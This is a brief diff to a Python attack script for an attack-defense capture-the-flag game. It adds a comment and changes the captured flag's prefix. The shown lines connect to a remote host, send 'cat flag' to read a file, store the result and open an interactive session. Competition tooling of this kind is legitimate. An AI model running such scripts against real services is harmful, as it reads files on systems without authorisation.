@@ -1,4 +1,6 @@
 #!/usr/bin/env python3
+# A script for awd exp
+
 import os
 import sys
 from time import sleep
@@ -19,7 +21,7 @@ r = remote(ip, port)
 
 r.sendline(b'cat flag')
 r.recvuntil(b'{')
-flag = b'flag{' + r.recvuntil(b'}')
+flag = b'viol1t{' + r.recvuntil(b'}')
 write_to_flags(flag)
 
 r.interactive()
